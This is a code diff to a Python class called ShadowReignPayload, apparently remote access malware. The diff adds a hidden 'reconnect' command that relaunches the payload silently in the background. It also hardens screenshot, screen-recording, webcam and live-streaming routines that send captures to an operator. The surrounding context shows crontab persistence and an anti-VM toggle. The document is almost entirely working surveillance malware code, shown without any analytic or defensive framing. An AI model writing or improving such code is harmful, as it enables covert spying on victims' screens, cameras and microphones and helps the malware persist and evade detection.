@@ -139,7 +139,8 @@ class ShadowReignPayload:
             "stream_webcam": self.stream_webcam,
             "stream_mic": self.stream_mic,
             "stop_stream": self.stop_stream,
-            "toggle_anti_vm": self.toggle_anti_vm
+            "toggle_anti_vm": self.toggle_anti_vm,
+            "reconnect": self.reconnect
         }
         if command in handlers:
             try:
@@ -158,6 +159,17 @@ class ShadowReignPayload:
                 subprocess.Popen(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except Exception:
             pass
+
+    def reconnect(self, _):
+        try:
+            # Relaunch in background and exit current instance
+            if platform.system() == "Windows":
+                subprocess.Popen(f"pythonw {os.path.abspath(__file__)}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            else:
+                subprocess.Popen(f"python3 {os.path.abspath(__file__)} &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.running = False  # Exit current instance
+        except Exception as e:
+            self.send_message(json.dumps({"error": f"Reconnect failed: {str(e)}"}))
 
     def toggle_anti_vm(self, enable):
         self.anti_vm_enabled = bool(enable)
@@ -222,21 +234,27 @@ class ShadowReignPayload:
     def screenshot(self, _):
         try:
             with mss.mss() as sct:
-                img = sct.grab(sct.monitors[1])
+                if not sct.monitors:
+                    self.send_message(json.dumps({"error": "No display available"}))
+                    return
+                img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
                 img_np = np.array(img)
-                _, buffer = cv2.imencode(".png", img_np)
+                _, buffer = cv2.imencode(".png", img_np, [int(cv2.IMWRITE_PNG_COMPRESSION), 9])
                 self.send_message(json.dumps({"screenshot": base64.b64encode(buffer).decode()}))
         except Exception as e:
-            self.send_message(json.dumps({"error": str(e)}))
+            self.send_message(json.dumps({"error": f"Screenshot failed: {str(e)}"}))
 
     def record_screen(self, _):
         try:
             sct = mss.mss()
+            if not sct.monitors:
+                self.send_message(json.dumps({"error": "No display available"}))
+                return
             fourcc = cv2.VideoWriter_fourcc(*"XVID")
             out = cv2.VideoWriter("screen.avi", fourcc, 5.0, (1920, 1080))
             start = time.time()
             while time.time() - start < 10:
-                img = sct.grab(sct.monitors[1])
+                img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
                 frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                 out.write(frame)
                 time.sleep(0.1)
@@ -252,7 +270,7 @@ class ShadowReignPayload:
             cap = cv2.VideoCapture(0)
             ret, frame = cap.read()
             if ret:
-                _, buffer = cv2.imencode(".jpg", frame)
+                _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                 self.send_message(json.dumps({"webcam": base64.b64encode(buffer).decode()}))
             else:
                 self.send_message(json.dumps({"error": "No webcam available"}))
@@ -337,8 +355,11 @@ class ShadowReignPayload:
         self.streaming_screen = True
         try:
             sct = mss.mss()
+            if not sct.monitors:
+                self.send_message(json.dumps({"error": "No display available"}))
+                return
             while self.streaming_screen:
-                img = sct.grab(sct.monitors[1])
+                img = sct.grab(sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0])
                 frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                 _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                 self.send_message(json.dumps({"stream_frame": base64.b64encode(buffer).decode()}))
